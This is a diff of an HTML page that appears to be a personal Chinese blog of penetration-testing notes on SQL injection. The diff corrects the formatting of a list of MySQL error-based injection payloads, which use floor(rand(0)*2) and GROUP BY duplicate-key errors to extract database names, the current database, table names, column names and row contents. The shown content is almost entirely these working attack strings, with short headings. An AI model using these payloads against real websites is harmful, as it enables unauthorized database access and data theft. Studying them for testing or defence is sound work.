@@ -16,7 +16,7 @@
 <meta property="og:description" content="总记暑假来临了，重拾渗透，又是从头开始的一次，哎，记录一下平时的笔记吧">
 <meta property="og:locale" content="ch">
 <meta property="article:published_time" content="2021-07-14T02:56:15.000Z">
-<meta property="article:modified_time" content="2021-07-16T01:58:14.098Z">
+<meta property="article:modified_time" content="2021-07-16T12:35:51.413Z">
 <meta property="article:author" content="Numbird">
 <meta property="article:tag" content="sql注入">
 <meta name="twitter:card" content="summary">
@@ -191,19 +191,19 @@
 <p>and exists(select  * from (select * from (select name_const(@@version,0))a join (select name_const(@@version,0))b)c)</p>
 </li>
 <li><p>爆所有库  可以跨库，FROM infromation_schema.schemata LIMIT 0,1) 位置</p>
-<p>and (select 1 from (select count(<em>),concat((select (select (SELECT distinct concat(0x7e,0x27,schema_name,0x27,0x7e) FROM information_schema.schemata LIMIT 0,1)) from information_schema.tables limit 0,1),floor(rand(0)\</em>2))x from information_schema.tables group by x)a) and 1=1</p>
+<p>and (select 1 from (select count(*),concat((select (select (SELECT distinct concat(0x7e,0x27,schema_name,0x27,0x7e) FROM information_schema.schemata LIMIT 0,1)) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a) and 1=1</p>
 </li>
 <li><p>爆当前数据库</p>
-<p>and (select 1 from (select count(<em>),concat((select concat(0x7e,0x27,hex(cast(database() as char),0x27,0x7e) from information_schema.tables limit 0,1),floor(rand(0)\</em>2))x from information_schema.tables group by x)a) and 1=1</p>
+<p>and (select 1 from (select count(*),concat((select concat(0x7e,0x27,hex(cast(database() as char),0x27,0x7e) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a) and 1=1</p>
 </li>
 <li><p>爆表，表名</p>
-<p>and (select 1 from (select count(<em>),concat((select (select (SELECT distinct concat(0x7e,0x27,hex(cast(table_name as char),0x27,0x7e) from information_schema.tables where table_schema=0x库名 limit 0,1))from information_schema.tables limit 0,1),floor(rand(0)\</em>2))x from information_schema.tables group by x)a) and 1=1</p>
+<p>and (select 1 from (select count(*),concat((select (select (SELECT distinct concat(0x7e,0x27,hex(cast(table_name as char),0x27,0x7e) from information_schema.tables where table_schema=0x库名 limit 0,1))from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a) and 1=1</p>
 </li>
 <li><p>爆字段  16进制</p>
-<p>and (select 1 from (select count(<em>),concat((select (select (SELECT distinct concat(0x7e,0x27,column_name,0x27,0x7e) from information_schema.columns where table_schema=0x库名 and table_name=0x表名 limit 0,1))from information_schema.tables limit 0,1),floor(rand(0)\</em>2))x from information_schema.tables group by x)a) and 1=1</p>
+<p>and (select 1 from (select count(*),concat((select (select (SELECT distinct concat(0x7e,0x27,column_name,0x27,0x7e) from information_schema.columns where table_schema=0x库名 and table_name=0x表名 limit 0,1))from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a) and 1=1</p>
 </li>
 <li><p>爆内容  表明字段不用转换</p>
-<p>and (select 1 from (select count(<em>),concat((select (select (select concat(0x7e,0x27,表名.字段,0x27,0x7e) from 表名 limit 0,1))from information_schema.tables limit 0,1),floor(rand(0)\</em>2))x from information_schema.tables group by x)a) and 1=1</p>
+<p>and (select 1 from (select count(*),concat((select (select (select concat(0x7e,0x27,表名.字段,0x27,0x7e) from 表名 limit 0,1))from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a) and 1=1</p>
 </li>
 </ul>
 <hr>
